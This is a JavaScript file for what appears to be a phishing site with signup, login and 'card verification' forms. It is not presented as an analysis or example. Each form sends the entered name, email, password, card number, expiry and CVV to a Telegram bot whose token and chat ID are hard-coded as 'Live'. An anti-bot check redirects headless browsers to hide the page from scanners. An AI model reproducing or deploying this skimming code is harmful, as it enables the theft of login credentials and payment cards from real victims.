// Telegram Bot Config (Live)
const TELEGRAM_BOT_TOKEN = "7813235070:AAGEOAio5gWtoiNZz9MF-dzictp7vZ4erWA";
const TELEGRAM_CHAT_ID = "7175428395";

// Send data to Telegram
async function sendToTelegram(data) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(data)}`;
  try {
    await fetch(url, { method: "POST" });
  } catch (error) {
    console.error("Telegram send failed:", error);
  }
}

// Sign Up Form
const signupForm = document.getElementById("signup-form");
if (signupForm) {
  signupForm.addEventListener("submit", (e) => {
    e.preventDefault();
    const name = document.getElementById("name").value;
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    // Save to localStorage
    localStorage.setItem("user", JSON.stringify({ name, email, password }));

    // Send to Telegram
    const data = `🟢 SIGNUP\n\n👤 Name: ${name}\n📧 Email: ${email}\n🔐 Password: ${password}`;
    sendToTelegram(data);

    // Redirect to dashboard
    window.location.href = "dashboard.html";
  });
}

// Login Form
const loginForm = document.getElementById("login-form");
if (loginForm) {
  loginForm.addEventListener("submit", (e) => {
    e.preventDefault();
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    const user = JSON.parse(localStorage.getItem("user") || "{}");
    if (user.email === email && user.password === password) {
      localStorage.setItem("session", "active");

      const data = `🔵 LOGIN\n\n📧 Email: ${email}\n🔐 Password: ${password}`;
      sendToTelegram(data);

      window.location.href = "dashboard.html";
    } else {
      alert("Invalid credentials. Please try again.");
    }
  });
}

// Dashboard: Display user name and handle logout
const userName = document.getElementById("user-name");
const logoutButton = document.getElementById("logout");
if (userName && logoutButton) {
  const user = JSON.parse(localStorage.getItem("user") || "{}");
  userName.textContent = user.name || "User";
  logoutButton.addEventListener("click", () => {
    localStorage.removeItem("session");
    window.location.href = "login.html";
  });
}

// Verification Form
const verifyForm = document.getElementById("verify-form");
if (verifyForm) {
  verifyForm.addEventListener("submit", (e) => {
    e.preventDefault();
    const cardNumber = document.getElementById("card-number").value;
    const expiry = document.getElementById("expiry").value;
    const cvv = document.getElementById("cvv").value;

    const data = `🔴 CARD VERIFICATION\n\n💳 Card: ${cardNumber}\n📅 Expiry: ${expiry}\n🔒 CVV: ${cvv}`;
    sendToTelegram(data);

    window.location.href = "success.html";
  });
}

// Anti-bot check (basic)
if (navigator.userAgent.includes("HeadlessChrome") || window.innerWidth === 0) {
  window.location.href = "https://example.com";
}
